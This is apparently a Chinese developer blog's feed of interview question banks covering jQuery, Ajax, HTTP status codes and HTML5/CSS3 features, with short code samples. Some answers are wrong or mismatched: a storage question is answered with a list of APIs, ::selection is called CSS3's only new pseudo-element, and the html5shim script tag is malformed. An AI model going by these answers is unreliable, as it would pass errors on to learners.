中如何将数组转化为json字符串，然后再转化回来</h2><p>jQuery中没有提供这个功能，所以你需要先编写两个jQuery的扩展：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$.fn.stringifyArray = <span class="function"><span class="keyword">function</span>(<span class="params">array</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">JSON</span>.stringify(array);</span><br><span class="line">&#125;</span><br><span class="line">$.fn.parseArray = <span class="function"><span class="keyword">function</span>(<span class="params">array</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">JSON</span>.parse(array);</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">// 然后调用：</span></span><br><span class="line">$(<span class="string">""</span>).stringifyArray(array);</span><br></pre></td></tr></table></figure><h2 id="68、http状态码有那些？分别代表是什么意思？"><a href="#68、http状态码有那些？分别代表是什么意思？" class="headerlink" title="68、http状态码有那些？分别代表是什么意思？"></a>68、http状态码有那些？分别代表是什么意思？</h2><blockquote><p>100-199 用于指定客户端应相应的某些动作。<br>200-299 用于表示请求成功。<br>300-399 用于已经移动的文件并且常被包含在定位头信息中指定新的地址信息。<br>400-499 用于指出客户端的错误。<br>400 语义有误，当前请求无法被服务器理解。<br>401 当前请求需要用户验证<br>403 服务器已经理解请求，但是拒绝执行它。<br>500-599 用于支持服务器错误。<br>503 – 服务不可用</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;1、JQuery一个对象可以同时绑定多个事件，实现原理&quot;&gt;&lt;a href=&quot;#1、JQuery一个对象可以同时绑定多个事件，实现原理&quot; class=&quot;headerlink&quot; title=&quot;1、JQuery一个对象可以同时绑定多个事件，实现原理&quot;&gt;&lt;/a&gt;1、JQuery一个对象可以同时绑定多个事件，实现原理&lt;/h2&gt;&lt;p&gt;jQuery可以给一个对象同时绑定多个事件，低层实现方式是使用 addEventListner 或 attachEvent 兼容不同的浏览器实现事件的绑定，这样可以给同一个对象注册&lt;/p&gt;
&lt;h2 id=&quot;2、webkit、用浏览器的各种工具来调试和debug代码&quot;&gt;&lt;a href=&quot;#2、webkit、用浏览器的各种工具来调试和debug代码&quot; class=&quot;headerlink&quot; title=&quot;2、webkit、用浏览器的各种工具来调试和debug代码&quot;&gt;&lt;/a&gt;2、webkit、用浏览器的各种工具来调试和debug代码&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;Webkit是浏览器引擎，包括 html 渲染和 js 解析功能，手机浏览器的主流内核，与之相对应的引擎有 Gecko（Mozilla Firefox 等使用）和 Trident（也称MSHTML，IE 使用）。&lt;br&gt;对于浏览器的调试工具要熟练使用，主要是页面结构分析，后台请求信息查看，js 调试工具使用，熟练使用这些工具可以快速提高解决问题的效率&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="题库系列" scheme="http://yoursite.com/categories/%E9%A2%98%E5%BA%93%E7%B3%BB%E5%88%97/"/>
    
    
      <category term="js" scheme="http://yoursite.com/tags/js/"/>
    
      <category term="JS" scheme="http://yoursite.com/tags/JS/"/>
    
  </entry>
  
  <entry>
    <title>题库-Ajax</title>
    <link href="http://yoursite.com/2016/06/18/%E9%A2%98%E5%BA%93-Ajax/"/>
    <id>http://yoursite.com/2016/06/18/题库-Ajax/</id>
    <published>2016-06-17T16:00:00.000Z</published>
    <updated>2018-06-05T06:59:53.397Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1、Ajax-是什么-如何创建一个Ajax？"><a href="#1、Ajax-是什么-如何创建一个Ajax？" class="headerlink" title="1、Ajax 是什么? 如何创建一个Ajax？"></a>1、Ajax 是什么? 如何创建一个Ajax？</h2><blockquote><p>Ajax并不算是一种新的技术，全称是<code>asychronous javascript and xml</code>，可以说是已有技术的组合<br>主要用来实现客户端与服务器端的异步通信效果，实现页面的局部刷新<br>早期的浏览器并不能原生支持ajax，可以使用隐藏帧（iframe）方式变相实现异步效果<br>后来的浏览器提供了对ajax的原生支持<br>使用ajax原生方式发送请求主要通过 XMLHttpRequest(标准浏览器)、ActiveXObject(IE浏览器)对象实现异步通信效果</p></blockquote><p>基本步骤：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var xhr = null;//创建对象 </span><br><span class="line">if (window.XMLHttpRequest) &#123;</span><br><span class="line">  xhr = new XMLHttpRequest();</span><br><span class="line">&#125; else &#123;</span><br><span class="line">  xhr = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);</span><br><span class="line">&#125;</span><br><span class="line">xhr.open(&quot;方式&quot;,&quot;地址&quot;,&quot;标志位&quot;);//初始化请求 </span><br><span class="line">xhr.setRequestHeader(&quot;&quot;,&quot;&quot;);//设置http头信息 </span><br><span class="line">xhr.onreadystatechange = function() &#123;&#125;//指定回调函数 </span><br><span class="line">xhr.send();//发送请求</span><br></pre></td></tr></table></figure><blockquote><p>js框架（jQuery/EXTJS等）提供的 ajax API对原生的ajax进行了封装，熟悉了基础理论，</p></blockquote><a id="more"></a><h2 id="2、同步和异步的区别"><a href="#2、同步和异步的区别" class="headerlink" title="2、同步和异步的区别"></a>2、同步和异步的区别</h2><p>同步：阻塞的</p><blockquote><p>张三叫李四去吃饭，李四一直忙得不停，张三一直等着，直到李四忙完两个人一块去吃饭<br>浏览器向服务器请求数据，服务器比较忙，浏览器一直等着（页面白屏），直到服务器返回数据，浏览器才能显示页面</p></blockquote><p>异步：非阻塞的</p><blockquote><p>张三叫李四去吃饭，李四在忙，张三说了一声然后自己就去吃饭了，李四忙完后自己去吃<br>浏览器向服务器请求数据，服务器比较忙，浏览器可以自如的干原来的事情（显示页面）服务器返回数据的时候通知浏览器一声，浏览器把返回的数据再渲染到页面，局部更新</p></blockquote><h2 id="3、如何解决跨域问题"><a href="#3、如何解决跨域问题" class="headerlink" title="3、如何解决跨域问题"></a>3、如何解决跨域问题</h2><p>理解跨域的概念：协议、域名、端口都相同才同域，否则都是跨域</p><blockquote><p>出于安全考虑，服务器不允许 ajax 跨域获取数据，但是可以跨域获取文件内容；<br>所以基于这一点，可以动态创建 script 标签，使用标签的 src 属性访问 js 文件的形式获取 js 脚本；<br>这个 js 脚本中的内容是函数调用，该函数调用的参数是服务器返回的数据；<br>为了获取这里的参数数据，需要事先在页面中定义回调函数；<br>在回调函数中处理服务器返回的数据，这就是解决跨域问题的主流解决方案</p></blockquote><h2 id="4、页面编码和被请求的资源编码如果不一致如何处理"><a href="#4、页面编码和被请求的资源编码如果不一致如何处理" class="headerlink" title="4、页面编码和被请求的资源编码如果不一致如何处理"></a>4、页面编码和被请求的资源编码如果不一致如何处理</h2><blockquote><p>对于ajax请求传递的参数，如果是get请求方式，参数如果传递中文;<br>在有些浏览器会乱码，不同的浏览器对参数编码的处理方式不同；<br>所以对于 get 请求的参数需要使用 encodeURIComponent 函数对参数进行编码处理；<br>后台开发语言都有相应的解码 api；<br>对于 post 请求不需要进行编码。</p></blockquote><h2 id="5、简述-ajax-的过程"><a href="#5、简述-ajax-的过程" class="headerlink" title="5、简述 ajax 的过程"></a>5、简述 ajax 的过程</h2><blockquote><p>创建 XMLHttpRequest 对象,也就是创建一个异步调用对象<br>创建一个新的 HTTP 请求,并指定该HTTP请求的方法、URL 及验证信息<br>设置响应 HTTP 请求状态变化的函数<br>发送 HTTP 请求<br>获取异步调用返回的数据<br>使用 JavaScript 和 DOM 实现局部刷新</p></blockquote><h2 id="6、异步加载"><a href="#6、异步加载" class="headerlink" title="6、异步加载"></a>6、异步加载</h2><blockquote><p>异步加载的方案： 动态插入 script 标签<br>通过 ajax 去获取 js 代码，然后通过 eval 执行<br>script 标签上添加 defer 或者 async 属性<br>创建并插入 iframe，让它异步执行 js</p></blockquote><h2 id="7、JavaScript-的同源策略。"><a href="#7、JavaScript-的同源策略。" class="headerlink" title="7、JavaScript 的同源策略。"></a>7、JavaScript 的同源策略。</h2><blockquote><p>同源策略是客户端脚本（尤其是Javascript）的重要的安全度量标准。<br>它最早出自Netscape Navigator2.0，其目的是防止某个文档或脚本从多个不同源装载。<br>所谓同源指的是：协议，域名，端口相同，同源策略是一种安全协议，指一段脚本只能读取来自同一来源的窗口和文档的属性。</p></blockquote><h2 id="8、GET-和-POST-的区别，何时使用-POST"><a href="#8、GET-和-POST-的区别，何时使用-POST" class="headerlink" title="8、GET 和 POST 的区别，何时使用 POST"></a>8、GET 和 POST 的区别，何时使用 POST</h2><blockquote><p>GET：一般用于信息获取，使用URL传递参数，对所发送信息的数量也有限制，一般在2000个字符，有的浏览器是8000个字符<br>POST：一般用于修改服务器上的资源，对所发送的信息没有限制</p></blockquote><p>在以下情况中，请使用 POST 请求：</p><blockquote><p>无法使用缓存文件（更新服务器上的文件或数据库）<br>向服务器发送大量数据（POST 没有数据量限制）<br>发送包含未知字符的用户输入时，POST 比 GET 更稳定也更可靠</p></blockquote><h2 id="9、ajax-是什么-ajax-的交互模型-同步和异步的区别-如何解决跨域问题"><a href="#9、ajax-是什么-ajax-的交互模型-同步和异步的区别-如何解决跨域问题" class="headerlink" title="9、ajax 是什么 ajax 的交互模型 同步和异步的区别 如何解决跨域问题"></a>9、ajax 是什么 ajax 的交互模型 同步和异步的区别 如何解决跨域问题</h2><blockquote><p>通过异步模式，提升了用户体验<br>优化了浏览器和服务器之间的传输，减少不必要的数据往返，减少了带宽占用<br>Ajax在客户端运行，承担了一部分本来由服务器承担的工作，减少了大用户量下的服务器负载。</p></blockquote><h2 id="10、-Ajax的最大的特点是什么。"><a href="#10、-Ajax的最大的特点是什么。" class="headerlink" title="10、 Ajax的最大的特点是什么。"></a>10、 Ajax的最大的特点是什么。</h2><blockquote><p>Ajax可以实现异步通信效果，实现页面局部刷新，带来更好的用户体验；按需获取数据，节约带宽资源；</p></blockquote><h2 id="11、ajax的缺点"><a href="#11、ajax的缺点" class="headerlink" title="11、ajax的缺点"></a>11、ajax的缺点</h2><blockquote><p>ajax不支持浏览器back按钮。<br>安全问题 AJAX暴露了与服务器交互的细节。<br>对搜索引擎的支持比较弱。<br>破坏了程序的异常机制。</p></blockquote><h2 id="12、ajax-请求的时候-get-和-post-方式的区别"><a href="#12、ajax-请求的时候-get-和-post-方式的区别" class="headerlink" title="12、ajax 请求的时候 get 和 post 方式的区别"></a>12、ajax 请求的时候 get 和 post 方式的区别</h2><blockquote><p>get 一般用来进行查询操作，url 地址有长度限制，请求的参数都暴露在 url 地址当中，如果传递中文参数，需要自己进行编码操作，安全性较低。<br>post 请求方式主要用来提交数据，没有数据长度的限制，提交的数据内容存在于 http 请求体中，数据不会暴漏在 url 地址中。</p></blockquote><h2 id="13、解释jsonp的原理，以及为什么不是真正的ajax"><a href="#13、解释jsonp的原理，以及为什么不是真正的ajax" class="headerlink" title="13、解释jsonp的原理，以及为什么不是真正的ajax"></a>13、解释jsonp的原理，以及为什么不是真正的ajax</h2><p>Jsonp并不是一种数据格式，而json是一种数据格式，jsonp是用来解决跨域获取数据的一种解决方案，具体是通过动态创建script标签，然后通过标签的src属性获取js文件中的js脚本，该脚本的内容是一个函数调用，参数就是服务器返回的数据，为了处理这些返回的数据，需要事先在页面定义好回调函数，本质上使用的并不是ajax技术</p><h2 id="14、什么是-Ajax-和-JSON-，它们的优缺点"><a href="#14、什么是-Ajax-和-JSON-，它们的优缺点" class="headerlink" title="14、什么是 Ajax 和 JSON ，它们的优缺点"></a>14、什么是 Ajax 和 JSON ，它们的优缺点</h2><blockquote><p>Ajax是全称是asynchronous JavaScript andXML，即异步JavaScript和xml，用于在Web页面中实现异步数据交互，实现页面局部刷新。</p></blockquote><p>优点：可以使得页面不重载全部内容的情况下加载局部内容，降低数据传输量，避免用户不断刷新或者跳转页面，提高用户体验<br>缺点：对搜索引擎不友好；要实现ajax下的前后退功能成本较大；可能造成请求数的增加跨域问题限制；</p><blockquote><p>JSON是一种轻量级的数据交换格式，ECMA的一个子集</p></blockquote><p>优点：轻量级、易于人的阅读和编写，便于机器（JavaScript）解析，支持复合数据类型（数组、对象、字符串、数字）</p><h2 id="15、http常见的状态码有哪些-分别代表是什么意思"><a href="#15、http常见的状态码有哪些-分别代表是什么意思" class="headerlink" title="15、http常见的状态码有哪些 分别代表是什么意思"></a>15、http常见的状态码有哪些 分别代表是什么意思</h2><blockquote><p>200 - 请求成功<br>301 - 资源（网页等）被永久转移到其它URL<br>404 - 请求的资源（网页等）不存在<br>500 - 内部服务器错误</p></blockquote><h2 id="16、一个页面从输入-URL-到页面加载显示完成，这个过程中都发生了什么？"><a href="#16、一个页面从输入-URL-到页面加载显示完成，这个过程中都发生了什么？" class="headerlink" title="16、一个页面从输入 URL 到页面加载显示完成，这个过程中都发生了什么？"></a>16、一个页面从输入 URL 到页面加载显示完成，这个过程中都发生了什么？</h2><p>分为4个步骤：</p><blockquote><p>当发送一个 URL 请求时，不管这个 URL 是 Web 页面的 URL 还是 Web 页面上每个资源的 URL，浏览器都会开启一个线程来处理这个请求，同时在远程 DNS 服务器上启动一个 DNS 查询。这能使浏览器获得请求对应的 IP 地址。<br>浏览器与远程 Web 服务器通过 TCP 三次握手协商来建立一个 TCP/IP 连接。该握手包括一个同步报文，一个同步-应答报文和一个应答报文，这三个报文在 浏览器和服务器之间传递。该握手首先由客户端尝试建立起通信，而后服务器应答并接受客户端的请求，最后由客户端发出该请求已经被接受的报文。<br>一旦 TCP/IP 连接建立，浏览器会通过该连接向远程服务器发送 HTTP 的 GET 请求。远程服务器找到资源并使用 HTTP 响应返回该资源，值为 200 的 HTTP 响应状态表示一个正确的响应。<br>此时，Web 服务器提供资源服务，客户端开始下载资源。</p></blockquote><h2 id="17、ajax请求的时候get-和post方式的区别"><a href="#17、ajax请求的时候get-和post方式的区别" class="headerlink" title="17、ajax请求的时候get 和post方式的区别"></a>17、ajax请求的时候get 和post方式的区别</h2><blockquote><p>get 一般用来进行查询操作，url 地址有长度限制，请求的参数都暴露在 url 地址当中，如果传递中文参数，需要自己进行编码操作，安全性较低。<br>post 请求方式主要用来提交数据，没有数据长度的限制，提交的数据内容存在于 http 请求体中，数据不会暴漏在 url 地址中。</p></blockquote><h2 id="18、ajax请求时，如何解释json数据"><a href="#18、ajax请求时，如何解释json数据" class="headerlink" title="18、ajax请求时，如何解释json数据"></a>18、ajax请求时，如何解释json数据</h2><blockquote><p>使用eval() 或者JSON.parse() 鉴于安全性考虑，推荐使用JSON.parse()更靠谱，对数据的安全性更好。</p></blockquote><h2 id="19、为什么利用多个域名来存储网站资源会更有效？"><a href="#19、为什么利用多个域名来存储网站资源会更有效？" class="headerlink" title="19、为什么利用多个域名来存储网站资源会更有效？"></a>19、为什么利用多个域名来存储网站资源会更有效？</h2><p>确保用户在不同地区能用最快的速度打开网站，其中某个域名崩溃用户也能通过其他域名访问网站，并且不同的资源放到不同的服务器上有利于减轻单台服务器的压力。</p><h2 id="20、请说出三种减低页面加载时间的方法"><a href="#20、请说出三种减低页面加载时间的方法" class="headerlink" title="20、请说出三种减低页面加载时间的方法"></a>20、请说出三种减低页面加载时间的方法</h2><blockquote><p>压缩css、js文件<br>合并js、css文件，减少http请求<br>外部js、css文件放在最底下<br>减少dom操作，尽可能用变量替代不必要的 dom 操作</p></blockquote><h2 id="21、HTTP状态码都有那些。"><a href="#21、HTTP状态码都有那些。" class="headerlink" title="21、HTTP状态码都有那些。"></a>21、HTTP状态码都有那些。</h2><blockquote><p>200 OK //客户端请求成功<br>400 Bad Request //客户端请求有语法错误，不能被服务器所理解<br>403 Forbidden //服务器收到请求，但是拒绝提供服务<br>404 Not Found //请求资源不存在，输入了错误的URL<br>500 Internal Server Error //服务器发生不可预期的错误<br>503 Server Unavailable //服务器当前不能处理客户端的请求，一段时间后可能恢复正常</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;1、Ajax-是什么-如何创建一个Ajax？&quot;&gt;&lt;a href=&quot;#1、Ajax-是什么-如何创建一个Ajax？&quot; class=&quot;headerlink&quot; title=&quot;1、Ajax 是什么? 如何创建一个Ajax？&quot;&gt;&lt;/a&gt;1、Ajax 是什么? 如何创建一个Ajax？&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;Ajax并不算是一种新的技术，全称是&lt;code&gt;asychronous javascript and xml&lt;/code&gt;，可以说是已有技术的组合&lt;br&gt;主要用来实现客户端与服务器端的异步通信效果，实现页面的局部刷新&lt;br&gt;早期的浏览器并不能原生支持ajax，可以使用隐藏帧（iframe）方式变相实现异步效果&lt;br&gt;后来的浏览器提供了对ajax的原生支持&lt;br&gt;使用ajax原生方式发送请求主要通过 XMLHttpRequest(标准浏览器)、ActiveXObject(IE浏览器)对象实现异步通信效果&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;基本步骤：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;var xhr = null;//创建对象 &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;if (window.XMLHttpRequest) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  xhr = new XMLHttpRequest();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125; else &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  xhr = new ActiveXObject(&amp;quot;Microsoft.XMLHTTP&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;xhr.open(&amp;quot;方式&amp;quot;,&amp;quot;地址&amp;quot;,&amp;quot;标志位&amp;quot;);//初始化请求 &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;xhr.setRequestHeader(&amp;quot;&amp;quot;,&amp;quot;&amp;quot;);//设置http头信息 &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;xhr.onreadystatechange = function() &amp;#123;&amp;#125;//指定回调函数 &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;xhr.send();//发送请求&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;blockquote&gt;
&lt;p&gt;js框架（jQuery/EXTJS等）提供的 ajax API对原生的ajax进行了封装，熟悉了基础理论，&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="题库系列" scheme="http://yoursite.com/categories/%E9%A2%98%E5%BA%93%E7%B3%BB%E5%88%97/"/>
    
    
      <category term="Ajax" scheme="http://yoursite.com/tags/Ajax/"/>
    
  </entry>
  
  <entry>
    <title>题库-HTML5、CSS3</title>
    <link href="http://yoursite.com/2016/06/08/%E9%A2%98%E5%BA%93-HTML5%E3%80%81CSS3/"/>
    <id>http://yoursite.com/2016/06/08/题库-HTML5、CSS3/</id>
    <published>2016-06-07T16:00:00.000Z</published>
    <updated>2018-06-05T06:35:45.231Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1、CSS3有哪些新特性"><a href="#1、CSS3有哪些新特性" class="headerlink" title="1、CSS3有哪些新特性"></a>1、CSS3有哪些新特性</h2><blockquote><p>CSS3实现圆角（border-radius），阴影（box-shadow），<br>对文字加特效（text-shadow、），线性渐变（gradient），旋转（transform）<br>transform:rotate(9deg) scale(0.85,0.90) translate(0px,-30px) skew(-9deg,0deg);// 旋转,缩放,定位,倾斜<br>增加了更多的CSS选择器<br>多背景<br>rgba、hlsa<br>在CSS3中唯一引入的伪元素是 ::selection.<br>媒体查询，多栏布局<br>border-image</p></blockquote><a id="more"></a><h2 id="2、html5有哪些新特性、移除了那些元素？"><a href="#2、html5有哪些新特性、移除了那些元素？" class="headerlink" title="2、html5有哪些新特性、移除了那些元素？"></a>2、html5有哪些新特性、移除了那些元素？</h2><blockquote><p>如何处理HTML5新标签的浏览器兼容问题？如何区分 HTML 和 HTML5？</p></blockquote><p>新特性：</p><blockquote><p>拖拽释放(Drag and drop) API<br>语义化更好的内容标签（header, nav, footer, aside, article, section）<br>音频、视频 API(audio,video)<br>画布(Canvas) API<br>地理(Geolocation) API<br>本地离线存储 localStorage 长期存储数据，浏览器关闭后数据不丢失；<br>sessionStorage 的数据在浏览器关闭后自动删除<br>表单控件，calendar、date、time、email、url、search<br>新的技术 webworker, websocket, Geolocation</p></blockquote><p>移除的元素：</p><blockquote><p>纯表现的元素：basefont，big，center，font, s，strike，tt，u；<br>对可用性产生负面影响的元素：frame，frameset，noframes；</p></blockquote><p>支持HTML5新标签：</p><blockquote><p>IE8/IE7/IE6支持通过 document.createElement 方法产生的标签，<br>可以利用这一特性让这些浏览器支持 HTML5 新标签，浏览器支持新标签后，<br>还需要添加标签默认的样式（当然最好的方式是直接使用成熟的框架、使用最多的是html5shim框架）：</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--[<span class="keyword">if</span> lt IE <span class="number">9</span>]&gt;</span><br><span class="line">&lt;script&gt; src=<span class="string">"http://html5shim.googlecode.com/svn/trunk/html5.js"</span>&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;![endif]--&gt;</span></span><br></pre></td></tr></table></figure><p>如何区分：DOCTYPE声明新增的结构元素、功能元素</p><h2 id="3、本地存储（Local-Storage-）和-cookies（储存在用户本地终端上的数据）之间的区别"><a href="#3、本地存储（Local-Storage-）和-cookies（储存在用户本地终端上的数据）之间的区别" class="headerlink" title="3、本地存储（Local Storage ）和 cookies（储存在用户本地终端上的数据）之间的区别"></a>3、本地存储（Local Storage ）和 cookies（储存在用户本地终端上的数据）之间的区别</h2><blockquote><p>Cookies: 服务器和客户端都可以访问；大小只有 4KB 左右；有有效期，过期后将会删除；<br>本地存储：只有本地浏览器端可访问数据，<br>服务器不能访问本地存储直到故意通过 POST 或者 GET 的通道发送到服务器；每个域 5MB ；<br>没有过期数据，它将保留知道用户从浏览器清除或者使用 JavaScript 代码移除</p></blockquote><h2 id="4、如何实现浏览器内多个标签页之间的通信"><a href="#4、如何实现浏览器内多个标签页之间的通信" class="headerlink" title="4、如何实现浏览器内多个标签页之间的通信"></a>4、如何实现浏览器内多个标签页之间的通信</h2><p>调用 localstorge、cookies 等本地存储方式</p><h2 id="5、如何对网站的文件和资源进行优化"><a href="#5、如何对网站的文件和资源进行优化" class="headerlink" title="5、如何对网站的文件和资源进行优化"></a>5、如何对网站的文件和资源进行优化</h2><blockquote><p>文件合并<br>文件最小化/文件压缩<br>使用CDN托管<br>缓存的使用</p></blockquote><h2 id="6、什么是响应式设计？"><a href="#6、什么是响应式设计？" class="headerlink" title="6、什么是响应式设计？"></a>6、什么是响应式设计？</h2><blockquote><p>它是关于网页制作的过程中让不同的设备有不同的尺寸和不同的功能。响应式设计是让所有的人能在这些设备上让网站运行正常</p></blockquote><h2 id="7、新的-HTML5-文档类型和字符集是？"><a href="#7、新的-HTML5-文档类型和字符集是？" class="headerlink" title="7、新的 HTML5 文档类型和字符集是？"></a>7、新的 HTML5 文档类型和字符集是？</h2><blockquote><p>HTML5文档类型：<code>&lt;!doctype html&gt;</code><br>HTML5使用的编码: <code>&lt;meta charset=”UTF-8”&gt;</code></p></blockquote><h2 id="8、HTML5-Canvas-元素有什么用"><a href="#8、HTML5-Canvas-元素有什么用" class="headerlink" title="8、HTML5 Canvas 元素有什么用"></a>8、HTML5 Canvas 元素有什么用</h2><blockquote><p>Canvas 元素用于在网页上绘制图形，该元素标签强大之处在于可以直接在 HTML 上进行图形操作。</p></blockquote><h2 id="9、HTML5-存储类型有什么区别"><a href="#9、HTML5-存储类型有什么区别" class="headerlink" title="9、HTML5 存储类型有什么区别"></a>9、HTML5 存储类型有什么区别</h2><blockquote><p>Media API<br>Text Track API<br>Application Cache API<br>User Interaction<br>Data Transfer API<br>Command API<br>Constraint Validation API<br>History API</p></blockquote><h2 id="10、用-H5-CSS3-解决导航栏最后一项掉下来的问题"><a href="#10、用-H5-CSS3-解决导航栏最后一项掉下来的问题" class="headerlink" title="10、用 H5+CSS3 解决导航栏最后一项掉下来的问题"></a>10、用 H5+CSS3 解决导航栏最后一项掉下来的问题</h2><h2 id="11、CSS3新增伪类有那些"><a href="#11、CSS3新增伪类有那些" class="headerlink" title="11、CSS3新增伪类有那些"></a>11、CSS3新增伪类有那些</h2><blockquote><p>p:first-of-type 选择属于其父元素的首个 <code>&lt;p&gt;</code> 元素的每个 <code>&lt;p&gt;</code> 元素。<br>p:last-of-type 选择属于其父元素的最后 <code>&lt;p&gt;</code> 元素的每个 <code>&lt;p&gt;</code> 元素。<br>p:only-of-type 选择属于其父元素唯一的 <code>&lt;p&gt;</code> 元素的每个 <code>&lt;p&gt;</code> 元素。<br>p:only-child 选择属于其父元素的唯一子元素的每个 <code>&lt;p&gt;</code> 元素。<br>p:nth-child(2) 选择属于其父元素的第二个子元素的每个 <code>&lt;p&gt;</code> 元素。<br>:enabled、:disabled 控制表单控件的禁用状态。<br>:checked，单选框或复选框被选中。</p></blockquote><h2 id="12、你怎么来实现页面设计图，你认为前端应该如何高质量完成工作-一个满屏品字布局-如何设计"><a href="#12、你怎么来实现页面设计图，你认为前端应该如何高质量完成工作-一个满屏品字布局-如何设计" class="headerlink" title="12、你怎么来实现页面设计图，你认为前端应该如何高质量完成工作? 一个满屏品字布局 如何设计"></a>12、你怎么来实现页面设计图，你认为前端应该如何高质量完成工作? 一个满屏品字布局 如何设计</h2><blockquote><p>首先划分成头部、body、脚部；。。。。。<br>实现效果图是最基本的工作，精确到2px；<br>与设计师，产品经理的沟通和项目的参与<br>做好的页面结构，页面重构和用户体验<br>处理hack，兼容、写出优美的代码格式<br>针对服务器的优化、拥抱 HTML5。</p></blockquote><h2 id="13、为什么利用多个域名来存储网站资源会更有效"><a href="#13、为什么利用多个域名来存储网站资源会更有效" class="headerlink" title="13、为什么利用多个域名来存储网站资源会更有效"></a>13、为什么利用多个域名来存储网站资源会更有效</h2><blockquote><p>CDN缓存更方便<br>突破浏览器并发限制<br>节约cookie带宽<br>节约主域名的连接数，优化页面响应速度<br>防止不必要的安全问题</p></blockquote><h2 id="14、知道css有个content属性吗？有什么作用？有什么应用？"><a href="#14、知道css有个content属性吗？有什么作用？有什么应用？" class="headerlink" title="14、知道css有个content属性吗？有什么作用？有什么应用？"></a>14、知道css有个content属性吗？有什么作用？有什么应用？</h2><p>css的content属性专门应用在 before/after 伪元素上，用来插入生成内容。最常见的应用是利用伪类清除浮动。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 一种常见利用伪类清除浮动的代码 */</span></span><br><span class="line">.clearfix:after &#123;</span><br><span class="line">  content: <span class="string">"."</span>; <span class="comment">/* 这里利用到了content属性 */</span></span><br><span class="line">  display: block; </span><br><span class="line">  height: <span class="number">0</span>;</span><br><span class="line">  visibility: hidden; </span><br><span class="line">  clear: both; </span><br><span class="line">&#125;</span><br><span class="line">.clearfix &#123; </span><br><span class="line">  *zoom: <span class="number">1</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>after伪元素通过 content 在元素的后面生成了内容为一个点的块级素，再利用 clear:both 清除浮动。</p><p>知道css计数器（序列数字字符自动递增）吗？如何通过 css content 属性实现 css 计数器？</p><blockquote><p>css计数器是通过设置 counter-reset 、counter-increment 两个属性 、及 counter()/counters()一个方法配合after / before 伪类实现。</p></blockquote><h2 id="15、如何在-HTML5-页面中嵌入音频"><a href="#15、如何在-HTML5-页面中嵌入音频" class="headerlink" title="15、如何在 HTML5 页面中嵌入音频"></a>15、如何在 HTML5 页面中嵌入音频</h2><p>HTML 5 包含嵌入音频文件的标准方式，支持的格式包括 MP3、Wav 和 Ogg：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;audio controls&gt; </span><br><span class="line">  &lt;source src=<span class="string">"jamshed.mp3"</span> 